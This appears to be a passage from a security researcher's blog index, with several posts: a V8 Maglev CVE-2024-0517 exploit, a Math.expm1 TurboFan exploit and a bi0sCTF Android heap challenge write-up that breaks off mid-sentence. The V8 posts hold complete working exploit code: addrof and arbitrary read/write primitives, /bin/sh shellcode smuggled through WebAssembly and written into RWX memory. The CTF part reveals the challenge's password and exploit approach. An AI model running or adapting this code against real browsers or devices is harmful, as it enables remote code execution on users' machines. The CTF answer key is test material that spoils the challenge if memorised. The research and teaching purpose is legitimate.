Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]); var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f1 = wasm_instance.exports.main; // to corrupt the pointer here. var wasm_code_helper = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); var wasm_mod_helper = new WebAssembly.Module(wasm_code_helper); var wasm_instance_helper = new WebAssembly.Instance(wasm_mod_helper); var f2 = wasm_instance_helper.exports.main; This is similar to the POC where they have specific conditions met to trigger the ExtendOrReallocateCurrentRawAllocation through the ClassBug. Additionally, the only confusing part is, how to know the number of times to call the reflect.construct and when do we know it triggered the actual bug. I was also confused reading the blogpost from exodus, when I asked the exploit dev, he suggested running it multiple times and getting the limit through trial and error.\nfunction gc(){ for(let i=0;i\u0026lt;0x10;i++) new ArrayBuffer(0x100000); } let dogc_flag = null; function dogc(){ if(dogc_flag){ gc(); } } let empty_object = {}; let empty_array = []; let corrupted_instance = null; // Main vulnerability. class ClassParent {} class ClassBug extends ClassParent { constructor(a20, a21, a22) { const v24 = new new.target(); let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object]; super(); let a = [1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1]; this.x = x; this.a = a; JSON.stringify(empty_array); } [1] = dogc(); } // jit compile the dogc() for (let i = 0; i\u0026lt;200; i++) { dogc_flag = false; if (i%2 == 0) dogc_flag = true; dogc(); } for (let i = 0; i \u0026lt; 650; i++) { dogc_flag=false; if (i == 644 || i == 645 || i == 646 || i == 640) { dogc_flag=true; dogc(); dogc_flag=false; } if (i == 646) dogc_flag=true; let x = Reflect.construct(ClassBug, empty_array, ClassParent); if (i == 646) { corrupted_instance = x; } } Once we get he corrupted instance, It should be straight forward exploitation. We can get addrof primitive and try to get arb read/ write primitive.\nfunction addrof(obj){ corrupted_instance.x[0] = obj; __f64_buf[0] = corrupted_instance.a[8]; return __u32_buf[0]; } // overwrite the length of `a` array. corrupted_instance.x[5] = 0x10000; let oob = [1.1, 2.2, 3.3]; let addr_oob = addrof(oob); let addr_a = addrof(corrupted_instance.a); // Quick check if(addr_oob \u0026lt; addr_a \u0026amp;\u0026amp; corrupted_instance.a.length != 0x10000){ console.log(\u0026#34;Exploit Failure!\u0026#34;); } let off = (addr_oob - addr_a ) + 0xc; if(off%8 != 0){ off -= 4; } off = off / 8; off += 9; print(\u0026#34;Achieved 64 bit read write primitive.\u0026#34;) function write_64(addr, val){ corrupted_instance.a[off] = itof(BigInt(0x3*0x100000000 + addr-8)); oob[0] = itof(BigInt(val)); } function read_64(addr){ corrupted_instance.a[off] = itof(BigInt(0x3*0x100000000 + addr-8)); return ftoi(oob[0]); } let addr_wasm = addrof(wasm_instance); let addr_rwx = read_64(addr_wasm + 0x48); print(\u0026#34;Leaks:\u0026#34;) print(\u0026#34;wasm_isntance: \u0026#34; + addr_wasm.toString(16)); print(\u0026#34;RWX region: \u0026#34; + addr_rwx.toString(16)); let shell_off = 0x81an // get the shellcode in memory. f1(); write_64(addrof(wasm_instance_helper)+0x48, addr_rwx+shell_off); // trigger the /bin/sh syscall. f2(); Smuggling shellcode: # Again I have explained it in this blogpost\nExtras # You can find my full exploit and related files here: repo to files new.target: This property indicates whether an object was instantiated using the new keyword. For class constructors, it provides a reference to the function with which the object was created, allowing for better control and functionality in class hierarchies. Reflect.construct: This method creates a new object using the specified target class constructor along with a provided argument list. It enables more flexible instantiation of objects, especially when dealing with inheritance and prototype chains. Allocation Folding: When the V8 engine anticipates a need for additional space in the future, it attempts to allocate the entire required memory in a single operation. This technique can optimize memory usage but may lead to vulnerabilities if not managed properly. FindNonDefaultConstructorOrConstruct: This function constructs an object by traversing the prototype chain to find a non-default constructor, invoking the appropriate super() constructor as needed. The optimization method VisitFindNonDefaultConstructorOrConstruct aims to streamline this process, enhancing performance. Reference # Special thanks to sherlock Bhaiya for the invaluable assistance in completing this exploit. Exodus Intelligence Blog: Google Chrome V8 CVE-2024-0517 - Out-of-Bounds Write \u0026amp; Code Execution ","date":"2024-05-03","externalUrl":null,"permalink":"/posts/1728446785503-cve-2024-0517-quick-blog/","section":"Blog Posts","summary":"\u003cp\u003eThis post explores a vulnerability found in the Maglev optimizing compiler of V8, specifically within a function responsible for optimizing classes that inherit from a parent class.\u003c/p\u003e","title":"CVE-2024-0517 Quick Blog","type":"posts"},{"content":"","date":"2024-05-03","externalUrl":null,"permalink":"/tags/maglev/","section":"Tags","summary":"","title":"Maglev","type":"tags"},{"content":"In this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process.\nWe\u0026rsquo;ll break down how this edge case is misoptimized by V8\u0026rsquo;s Turbofan compiler, explore the root cause of the issue, and demonstrate how this leads to unexpected behavior.\nFor context, we’ll focus on the technical aspects surrounding the typer phase and its consequences for browser exploitation. PS: This is more or less my notes, So if there is any errors/false observations please bear with it and ping me on discord (tourpran).\nBackground on Math.expm1 # The Math.expm1(x) function calculates e^x - 1 with improved precision for small values of x. For example:\nMath.expm1(0) returns 0 Math.expm1(-0) returns -0, due to the handling of signed zeros in JavaScript. This distinction is significant in JavaScript, where 0 and -0 behave differently in equality comparisons and mathematical operations. According to the ECMAScript specification, Math.expm1(-0) should return -0, but a bug in V8\u0026rsquo;s optimization pipeline causes it to be incorrectly handled.\nExpected Behavior of Math.expm1(-0) # The ECMAScript spec mandates that Math.expm1(-0) must return -0. This behavior is critical when dealing with negative zero in JavaScript. Here’s why:\n0 and -0 are distinct values in JavaScript, despite being equal according to == and ===. However, Object.is(0, -0) correctly returns false, recognizing the difference between the two. When Math.expm1(-0) is mishandled during optimization, it leads to incorrect behavior in cases where signed zeros are important. Understanding the bug: # The typer processes the code by executing several phases:\nTyper Phase: Determines the types of various nodes in the graph. TypeNarrowingReducer: Eliminates unnecessary loads based on narrowed types. Simplified Lowering Phase: Applies further optimizations by lowering nodes into simpler operations. In the case of Math.expm1(-0), the result should always be -0. However, the typer mistakenly classifies the range as (plainNumber, NaN), when in fact, -0 is neither a plain number nor a NaN, leading to an incorrect assumption during type analysis. Object.is() # 1- Initial Phase: # The typer assigns the Object.is() node as a SameValue node. This can be seen in turbolizer. 2- Typed Optimization: # In this phase, SameValue is further reduced to ObjectIsMinusZero() when either side of the comparison involves -0. This makes comparisons more efficient by focusing on the specific case of -0. else if (lhs_type.Is(Type::MinusZero())) { // SameValue(x:minus-zero,y) =\u0026gt; ObjectIsMinusZero(y) node-\u0026gt;RemoveInput(0); NodeProperties::ChangeOp(node, simplified()-\u0026gt;ObjectIsMinusZero()); return Changed(node); } else if (rhs_type.Is(Type::MinusZero())) { // SameValue(x,y:minus-zero) =\u0026gt; ObjectIsMinusZero(x) node-\u0026gt;RemoveInput(1); NodeProperties::ChangeOp(node, simplified()-\u0026gt;ObjectIsMinusZero()); return Changed(node); } 3- Simplified Lowering: # This phase further optimizes the ObjectIsMinusZero() node. If the input is confirmed to be -0, the node is simplified and deferred for replacement, enhancing overall efficiency. case IrOpcode::kObjectIsMinusZero: Type const input_type = GetUpperBound(node-\u0026gt;InputAt(0)); if (input_type.Is(Type::MinusZero())) { VisitUnop(node, UseInfo::None(), MachineRepresentation::kBit); if (lower()) { DeferReplacement(node, lowering-\u0026gt;jsgraph()-\u0026gt;Int32Constant(1)); } } Patch and Bug Details: # The Math.expm1() operation is incorrectly converted to a combination of Float64Expm1 and ChangeFloat64ToTagged, which causes -0 to be truncated to 0. By using a Call node and invoking the inbuilt V8 Math.expm1, this truncation issue can be avoided. The patch has only been applied to typer.cc but not to operation-typer, allowing the creation of a Call node using V8 builtins to correctly handle Math.expm1, even though it still makes incorrect type assumptions. This patch addresses the issue in typer.cc, but a more comprehensive solution requires changes in other parts of the type system to fully fix the handling of -0 in Math.expm1.\nPipeline of TurboFan: # TurboFan’s pipeline consists of multiple phases that optimize and lower JavaScript code into highly optimized machine code. The key stages include type inference, node optimization (such as SameValue being converted to checks like ObjectIsMinusZero), and various lowering phases that simplify and optimize the code.\nTyper Phase: # The typer traverses all the nodes in the intermediate representation (IR) and processes them through the GraphReducer. For each node, it attempts to assign the most accurate type information, optimizing how the node will be executed in subsequent phases. Type Lowering: # This phase focuses on extensive optimizations, including refining operations and simplifying nodes for better performance in the backend stages of Turbofan. Escape analysis: # function f() { let o = {a: 5}; return o.a; } Clearly, it can be rewritten as:\nfunction f() { let 0. a = 5; return o_a; } Great Video on Escape Analysis\nAdditional Optimizations # If you\u0026rsquo;re interested, you can find more information about V8 TurboFan\u0026rsquo;s optimizations in the documentation here. Exploitation: # Problem: The sameValue variable is of boolean type, which leads to the type assumption of (0, 1337), resulting in no out-of-bounds (OOB) access.\nAs mentioned in the blog, we need to retain the sameValue node until the final optimization, folding it to true. This means the compiler shouldn\u0026rsquo;t be aware that we\u0026rsquo;re comparing with -0 until the very last optimization step.\nIn escape analysis, we can replace -0 with Object.is(), and during simplified lowering, we achieve the desired range value, allowing us to remove the bounds check. The assumed return type becomes false, ensuring that it will always remain within the array limits.\n#79: CheckBounds[VectorSlotPair(INVALID)] (#125:NumberMultiply, #58:NumberConstant, #45:Checkpoint, #43:Call) [Static type: Range(0, 4), Feedback type: Range(0, 0)]\nOOB Array Creation: # By exploiting out-of-bounds (OOB) array access, we can leak the addresses of objects by keeping them close to a float array. After much trial and error, along with extensive monkey patching, I finally discovered a more effective method for achieving a memory leak. function addrof(x, i = 1) { let a = [1.1, 2.2, 3.3]; let b = [5.5, 5.5, 5.5, 5.5, 5.5]; let o = { m: -0 }; let t = Object.is(Math.expm1(x), o.m) + 0; t *= (i + 0); // Convert i to an integral type. let val = a[t]; oob_rw_buffer = b; return val; } Here, a is the array from which we want to access out-of-bounds values, while b is the array where we intend to manipulate the length field.\nTricky Part: The parameter i has an ambiguous type, so I added 0 to it to ensure it is treated as an integral type. This adjustment, along with the feedback, enables the OOB read. Silly JavaScript engine!\nFinally, I\u0026rsquo;m storing the context of b in the oob_rw_buffer. Below is a rough illustration of the leak following the adjustment to the fixed array a.\nLeaks of the current state:\n3) int: 0x7a7e2501459 4) int: 0x500000000 5) int: 0x4016000000000000 6) int: 0x4016000000000000 7) int: 0x4016000000000000 8) int: 0x4016000000000000 9) int: 0x4016000000000000 10) int: 0x375928582cf9 - (map of b) 11) int: 0x7a7e2500c21 - (property of b) 12) int: 0x65ad13cc1c9 - (element backing pointer of b) 13) int: 0x500000000 - (length field) 14) int: 0x7a7e2500561 15) int: 0x8000000000000000 16) int: 0x3ff199999999999a 17) int: 0x3ff199999999999a 18) int: 0x3ff199999999999a 19) int: 0x3ff199999999999a Addrof Primitive: # With the OOB array in place, having another array afterwards allows us to perform an OOB array read, thus enabling the creation of an addrof primitive. let oob_rw_buffer = undefined; let aux_arr = undefined; function addrof(obj){ aux_arr[0] = obj; return oob_rw_buffer[0x12]; } function stagel(x, i=1){ let a = [1.1, 2.2, 3.3]; let b = [5.5, 5.5, 5.5, 5.5, 5.5]; let c = [{}, 1, 2]; let o = {m: -0}; let t = Object.is(Math.expml(x), o.m) + 0; // trigger the bug. t *= (i+0); // i to inegral. a[t] = 1024*1024; oob_rw_buffer = b; // expose b to global scope aux arr = c; return 0; } Arb Read / Arb Write: # By storing the ArrayBuffer after all the allocations, we can calculate the offset difference between the ArrayBuffer and the OOB array. This enables us to perform arbitrary read and write operations. function arb_write(addr, val) { oob_rw_buffer[diff / 8n] = addr.i2f(); dv.setBigUint64(0, val, true); } function arb_read(addr) { oob_rw_buffer[diff / 8n] = addr.i2f(); return dv.getBigUint64(0, true); } Final Exploit: # This is the final exploit I\u0026rsquo;ve developed, ready to target the V8 engine. However, to ensure reliability for Chrome, I need to correct the objects I corrupted and proceed with caution. If we manage to escape the Chrome sandbox, it’s game over.\n// ------------------------------------------------ Utility- Functions ------------------------------------------------ // let conversion_buffer = new ArrayBuffer(8); let float_view = new Float64Array(conversion_buffer); let int_view = new BigUint64Array(conversion_buffer); BigInt.prototype.hex = function() { return \u0026#39;0x\u0026#39; + this.toString(16); }; BigInt.prototype.i2f = function() { int_view[0] = this; return float_view[0]; } BigInt.prototype.smi2f = function() { int_view[0] = this \u0026lt;\u0026lt; 32n; return float_view[0]; } Number.prototype.f2i = function() { float_view[0] = this; return int_view[0]; } Number.prototype.f2smi = function() { float_view[0] = this; return int_view[0] \u0026gt;\u0026gt; 32n; } Number.prototype.i2f = function() { return BigInt(this).i2f(); } Number.prototype.smi2f = function() { return BigInt(this).smi2f(); } // ----------------------------------------------- Starting the exploit ----------------------------------------------- // let oob_rw_buffer = undefined; let aux_arr = undefined; function addrof(obj){ aux_arr[0] = obj; return oob_rw_buffer[0x12]; } function stage1(x, i=1){ let a = [1.1, 2.2, 3.3]; let b = [5.5, 5.5, 5.5, 5.5, 5.5]; let c = [{}, 1, 2]; let o = {m: -0}; let t = Object.is(Math.expm1(x), o.m) + 0; // trigger the bug. t *= (i+0); // i to inegral. a[t] = 1024*1024; oob_rw_buffer = b; // expose b to global scope aux_arr = c; return 0; } stage1(0); for(let i=0;i\u0026lt;100000;i++){ stage1(\u0026#34;0\u0026#34;); } stage1(-0, 13); // get the OOB array. console.log(\u0026#34;[+] Stage 1: Obtained a OOB array\u0026#34;); // Stage 2 function arb_write(addr, val){ oob_rw_buffer[diff/8n] = addr.i2f(); dv.setUint32(0, val, true); } function arb_read(addr){ oob_rw_buffer[diff/8n] = addr.i2f(); return dv.getBigUint64(0, true); } function shell_write(addr, shellcode){ for(let i=0;i\u0026lt;shellcode.length;i++){ arb_write(addr+BigInt(4*i), shellcode[i]); } } let buf = new ArrayBuffer(0x100); let dv = new DataView(buf); buf_addr = addrof(buf).f2i(); oob_addr = addrof(oob_rw_buffer).f2i(); let diff = buf_addr-oob_addr+72n; //from the OOB array to array buffer console.log(\u0026#34;[+] ArrayBuffer addr: \u0026#34; + buf_addr.hex()); console.log(\u0026#34;[+] Offset btw oob and arraybuffer: \u0026#34; + diff); // wasm for RWS shellcode var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); var wasmModule = new WebAssembly.Module(wasmCode); var wasmInstance = new WebAssembly.Instance(wasmModule); var func = wasmInstance.exports.main; var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00]; rwx = arb_read(addrof(wasmInstance).f2i() +0x00e8n -1n); console.log(\u0026#34;[+] Got the Address of RWX segment: \u0026#34; + rwx.hex()); shell_write(rwx, shellcode); func(); To get the follow files, you can visit here.\nDebugging Tools: # The helper code for GDB can be found in src/objects-printer.cc.\nThe node structure comprises a variety of methods, including:\nMethods: new, clone, isDead, kill, etc. Variables: Includes operation descriptions (e.g., opcode related) and properties. Use the following flags for additional insights:\n--trace-turbo: Generates the Turbolizer graph. --trace-representation: Provides feedback types and information about each optimization phase. Useful Links: # Exploiting Math.expm1 in V8 Krautflare: A Deep Dive ","date":"2024-02-19","externalUrl":null,"permalink":"/posts/1728449827421-expm1-35c3---bug/-optimizations-analysis/","section":"Blog Posts","summary":"\u003cp\u003eIn this post, we’ll dive deep into a fascinating bug in the V8 JavaScript engine that arises from the mishandling of the Math.expm1(-0) function during the optimization process.\u003c/p\u003e","title":"expm1-35C3 - Bug/ Optimizations Analysis","type":"posts"},{"content":"","date":"2024-02-19","externalUrl":null,"permalink":"/tags/math.expm1/","section":"Tags","summary":"","title":"Math.expm1","type":"tags"},{"content":"","date":"2024-02-19","externalUrl":null,"permalink":"/tags/oob/","section":"Tags","summary":"","title":"OOB","type":"tags"},{"content":"","date":"2024-02-19","externalUrl":null,"permalink":"/tags/typer/","section":"Tags","summary":"","title":"Typer","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/bi0sctf/","section":"Tags","summary":"","title":"Bi0sctf","type":"tags"},{"content":"","date":"2024-02-01","externalUrl":null,"permalink":"/tags/reverse_shell/","section":"Tags","summary":"","title":"Reverse_Shell","type":"tags"},{"content":"I created an Android based pwn challenge that involes exploiting a dynamic memory allocator using the webview interface.\nThe challenge inclues the following sections:\nnative.c: Reverse engineering matrix operations performed. tallocator.c: Exploiting an arbitrary free to corrupt heap metadata. Reverse shellcode to execute an ORW. Challenge Points: 995 Solves: 4\nChallenge Author: # tourpran: Memory Allocator Exploitation, tallocator.c the.m3chanic: Reverse Engineering, native.c k0m1: General Android Dev Challenge Description: # Built our enhanced memory allocator, designed specifically for admins and prioritizing both speed and security. Experience the boost in performance firsthand with our website speed tester.\nChallenge File: # Primary Link Mirror Link General: # First time, creating an android X pwn challenge, it was pretty fun and straight forward to solve. This challenge was inspired from google CTF: TRIDROID. If you are new to this, I heavily recomend going through that first. We will go in this specific order to solve the challenge.\nDebugging with gdbserver Reversing the native.c Exploiting the tallocator.c Writing Reverse Shellcode Packing the Exploit Introduction: The App: # Lets start analyzing the application from AndroidManifest.xml by throwing our application into JADX. The application has a very simple working with just one activity MainActivity and also has Internet Permission. Looking into MainActivity.java\n@Override public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.w = (WebView) findViewById(R.id.webView); this.b = new BroadcastReceiver() { @Override // android.content.BroadcastReceiver public void onReceive(Context context, Intent intent) { if (Objects.equals(intent.getAction(), MainActivity.INTENT1)) { MainActivity.this.w.loadUrl((String) Objects.requireNonNull(intent.getStringExtra(\u0026#34;url\u0026#34;))); } } }; IntentFilter intentFilter = new IntentFilter(); intentFilter.addAction(INTENT1); registerReceiver(this.b, intentFilter); this.w.getSettings().setJavaScriptEnabled(true); this.w.getSettings().setCacheMode(2); this.w.addJavascriptInterface(this, \u0026#34;bi0sctf\u0026#34;); this.w.setWebViewClient(new WebViewClient()); this.w.setWebChromeClient(new WebChromeClient()); this.w.loadUrl(\u0026#34;http://example.net\u0026#34;); } We Could see that this activity has a Webview loading example.net. We can load a custom url using the Dynamic Broadcast Receiver which takes an extra url. We could notice that a library named tallocator is being loaded and it provides 2 native functions - talloc and tree. public native long talloc(int i, byte[] bArr); public native int tree(long j); Along with that, this webview provides a JavascriptInterface, whose methods can be accessed via bi0sctf instance. @JavascriptInterface public long secure_talloc(String str, int i, byte[] bArr) { if (new a().check(str)) { return talloc(i, bArr); } return -1L; } @JavascriptInterface public int secure_tree(String str, long j) { if (new a().check(str)) { return tree(j); } return -1; } There are 2 functions that has @JavascriptInterface notation - secure_talloc and secure_tree, which internally accesses the native functions talloc and tree if we bypass the check method of class a. Looking at class a:\npublic class a { public native boolean check(String str); static { System.loadLibrary(\u0026#34;native\u0026#34;); } } It has just one method check that is being implemented in a JNI Library named native, Which will be covered in the upcoming sections. Debugging with gdberver: # Create the android image with the same specifications as given in the script.py (with AVDManager). subprocess.call( \u0026#34;avdmanager\u0026#34; + \u0026#34; create avd\u0026#34; + \u0026#34; --name \u0026#39;Pixel_4_XL\u0026#39;\u0026#34; + \u0026#34; --abi \u0026#39;default/x86_64\u0026#39;\u0026#34; + \u0026#34; --package \u0026#39;system-images;android-30;default;x86_64\u0026#39;\u0026#34; + \u0026#34; --device pixel_4_xl\u0026#34; + \u0026#34; --force\u0026#34; + \u0026#34; \u0026gt; /dev/null 2\u0026gt; /dev/null\u0026#34;, env=ENV,close_fds=True,shell=True) Install the apk into the emulator and run the app. Meanwhile in adb get the pid of the app and attach gdbserver to that pid with port forwarding enabled. In our machine we just connect gdb to that port using: $ adb forward tcp:7777 tcp:port $ gdb $ target remote 127.0.0.1:port More information on how to work with gdbserver and inpecting memory is given here. Reversing the native.c: # The working of the.m3chanic\u0026rsquo;s part of the challenge is pretty straightforward.\nLet us start by looking at where our input is involved in this\nFirst, a floating point array of 4x4 is being initialised, and being passed to a function v4 void func_1(float a1[4][4]) { for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 4; j++) { char c; scanf(\u0026#34;%c\u0026#34;, \u0026amp;c); a1[i][j] = (float)c; } } } This function is simple, it\u0026rsquo;s just taking 16 characters as input and storing them as a 2d floating point matrix Next up it\u0026rsquo;s initialising another 4x4 floating point array, and passing it to another function func_7 is as follows\nvoid func_7(float a1[x][x], float a2[x][x]) { int i, j; for (i = 0; i \u0026lt; x; i++) { for (j = 0; j \u0026lt; x; j++) { a2[i][j] = a1[i][j]; } } } This function is just copying the matrix to a2, so now v2 contains our input Next,\nfloat func_2(int a1, int a2, float a3[a1][a2]) { if (a1 != a2) { return 0; } float v1 = 0; if (a1 == 1) { v1 = a3[0][0]; } else { for (int i = 0; i \u0026lt; a1; i++) { float v2[a1 - 1][a2 - 1]; for (int j = 1; j \u0026lt; a1; j++) { for (int k = 0; k \u0026lt; i; k++) { v2[j - 1][k] = a3[j][k]; } for (int k = i + 1; k \u0026lt; a2; k++) { v2[j - 1][k - 1] = a3[j][k]; } } int v3 = (i % 2 == 0) ? 1 : -1; v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2); } } return v1; } This function is called with arguments (4, 4, input_arr) It is declaring another floating point array v2 (local to this function), of 1 square dimension lesser than our input matrix Let\u0026rsquo;s break down this for loop:\nfor (int j = 1; j \u0026lt; a1; j++) { for (int k = 0; k \u0026lt; i; k++) { v2[j - 1][k] = a3[j][k]; } for (int k = i + 1; k \u0026lt; a2; k++) { v2[j - 1][k - 1] = a3[j][k]; } } Currently, we know that v2 forms some kind of submatrix of the original matrix that we pass in, and that checks out seeing how it is being populated inside this for loop A float v1 is being initialised to 0 as well. int v3 = (i % 2 == 0) ? 1 : -1; v1 += v3 * a3[0][i] * func_2(a1 - 1, a2 - 1, v2); Then, based on the index value of i (as in, whether or not it is divisible by 2), it is set to either 1 or -1 And it is multiplied with the current column value of a3 and then multiplied with the return value of func_2 but with a smaller sub-matrix If you see through this abstraction a little bit, and try and look at it as an implementation of something already existing, you will quickly realised that func_2 is just calculating the determinant of whatever matrix you pass to it (Some things that give this away are the fact that submatrix is passed on recursively, and -1 is multiplied with the final return value based on the current index, which is the case for determinant also)\nNext up, a new 4x4 matrix is being initialised and being passed to a function along with our input matrix\nvoid func_3(int a1, float a2[a1][a1], float a3[a1][a1]) { float v1[a1 - 1][a1 - 1]; for (int i = 0; i \u0026lt; a1; i++) { for (int j = 0; j \u0026lt; a1; j++) { int sub_i = 0, sub_j = 0; for (int v2 = 0; v2 \u0026lt; a1; v2++) { if (v2 == i) continue; for (int v3 = 0; v3 \u0026lt; a1; v3++) { if (v3 == j) continue; v1[sub_i][sub_j] = a2[v2][v3]; sub_j++; } sub_i++; sub_j = 0; } int v4 = (i + j) % 2 == 0 ? 1 : -1; a3[i][j] = v4 * func_2(a1 - 1, a1 - 1, v1); } } } Similar to the previous function, another submatrix is being initialised inside the function and is being populated - again, based on the indices This one seems straightforward now that we\u0026rsquo;ve understood the previous function It is simply calculating the minor matrix of the matrix passed as argument to it, and is finding the determinant of that matrix. This is the same as finding the cofactor of the given matrix (again, looking at it literally might not make sense at first, but once you try and think of it as an implementation of something else, the dots will start connecting).\nNext function\nvoid func_4(int a1, int a2, float a3[a1][a2], float a4[a2][a1]) { for (int i = 0; i \u0026lt; a1; i++) { for (int j = 0; j \u0026lt; a2; j++) { a4[j][i] = a3[i][j]; } } } This one is simple, it just transposes the matrix you give it as input Now, I think you can start seeing the full picture as well\nFirst, we found the determinant of the matrix, next we found the cofactor matrix and transposed it (Keep in mind, transpose of the cofactor matrix is the same as finding the adjoint of a given matrix)\nNext up, it\u0026rsquo;s taking the adjoint of the matrix we input, and dividing it with the determinant we found of it earlier\nvoid inverse_matrix(int N, float matrix[N][N], float inverse[N][N], int det, float cofactor[N][N]) { for (int i = 0; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; N; j++) { inverse[i][j] = (float) (cofactor[j][i] / det); } } } This is the same formula as finding the inverse of a given matrix ;)\nAnd finally, the inverse of our matrix is being compared with a precalculated inverse By property, (A⁻¹)⁻¹ == A itself, so all we need to do is find the inverse of the precalculated matrix\nFinding that, and rounding off the numbers appropriately and converting them to their ascii characters will give us this as the valid input: 50133tbd5mrt1769 And now we can proceed to the rest of the challenge! :)\nExploiting the tallocator.c: # It is pretty straight forward to reverse engineer the talloc/tree functions that act similar to the malloc/free. So, I will be using my source code to explain things more clearly. Lets start off with a quick code run through\u0026hellip;\nEssentials: # int init_talloc(){ if(init_called == true){ return 0; } runDebug = mmap((void*)0x41410000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); init_called = true; HeapStart = sbrk(0x1000); PUT(HeapStart+8, 0x30); PUT(HeapStart+0x38, (0x1000 - 0x38)); PUT(HeapStart+0x20, 0x3a63); top_chunk = HeapStart + 0x38; } In init_talloc, we can see that the runDebug is set to a mmapped region with RWX permisions, which has an addres of 0x41410000. Rest, initializes the Heapstart and topchunk to their appropriate values after an sbrk syscall. talloc: # Debugger_talloc = *(long long *)(HeapStart+40); if(Debugger_talloc != 0){ void (*call_debugger)() = (void (*)())Debugger_talloc; call_debugger(); perror(\u0026#34;Debugger called !!\u0026#34;); } Quickly checks if the Debugger_talloc is set to NULL, otherwise it jumps to whatever it is pointing to. if(alloc_size \u0026lt;= 0x150 \u0026amp;\u0026amp; (ull *)HEAD_SHORT != 0){ void* curr_ptr = (void *)HEAD_SHORT; int cnt = 0; while(curr_ptr != NULL \u0026amp;\u0026amp; cnt != 20){ if(GETSIZE(curr_ptr) \u0026gt;= alloc_size \u0026amp;\u0026amp; abs(alloc_size-GETSIZE(curr_ptr)) \u0026lt; best_size){ best_size = abs(alloc_size - GETSIZE(curr_ptr)); ptr = (ull*)curr_ptr; } curr_ptr = (ull *)*(ull *)(curr_ptr); cnt += 1; } if(ptr != 0 \u0026amp;\u0026amp; GET_FWD(ptr) != 0){ SET_BKD(GET_FWD(ptr), GET_BKD(ptr)); } if(ptr != 0 \u0026amp;\u0026amp; GET_BKD(ptr) != 0){ SET_FWD(GET_BKD(ptr), GET_FWD(ptr)); } if((ull)ptr == HEAD_SHORT){ PUT(\u0026amp;HEAD_SHORT, GET(ptr)); } } Pretty Simple, straight forward use of getting a free chunk. Get the HEAD_SHORT from the top of the created heap, iterate through the entire linked_list and keep storing your best fit size and a pointer to that chunk. Finally unlink that particular chunk from the linked list. The same process is done if the request for the chunk was above the range 0x150, instead updating from the HEAD_LONG. If no chunk is present in the linked list, it just takes space from the top_chunk. note: HEAD_LONG and HEAD_SHORT are both stored on top of our entire heap. tree: # if(chunk_size \u0026lt;= 0x100){ if(HEAD_SHORT == 0){ SET_FWD(ptr, 0); SET_BKD(ptr, \u0026amp;HEAD_SHORT); HEAD_SHORT = (ull)ptr; return 0; } SET_FWD(ptr, HEAD_SHORT); SET_BKD(ptr, \u0026amp;HEAD_SHORT); SET_BKD(HEAD_SHORT, ptr); HEAD_SHORT = (ull)ptr; } Essentially, adds it back to the linked list, pointed by HEAD_SHORT and HEAD_LONG. other: # #define SET_USE(p) *(ull *)(p-8) = (*(ull *)(p-8)) | 0b1 #define SET_FREE(p) *(ull *)(p-8) = (*(ull *)(p-8)) \u0026amp; ~(0b1UL) Every chunk is 16 bytes aligned, hence I made it so that the last bit in the size_field as either: 1: currently in use 0: free to use Helper Functions: # function p64(data){ const byteArray = new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) let i=0 while(data \u0026gt; 0){ byteArray[i] = data\u0026amp;0xff data = (data - data%256) / 256 i = i+1 } return String.fromCharCode.apply(String, byteArray) } function fin(data){ const byte_array = [] for (const character of data) { const code = character.charCodeAt(0) byte_array.push(code) } return byte_array } function u64(data){ return parseInt(data.match(/../g).reverse().join(\u0026#39;\u0026#39;), 16) } Helps converting the 8 byte data stream in little endian to write specific address into memory. Bug: # We are able to free arbitrary pointers eventough it has some basic restrictions. Hence, Forging a fake chunk and using that to access the free list pointers on top of the heap. Manipulating the free_list pointers will get us to 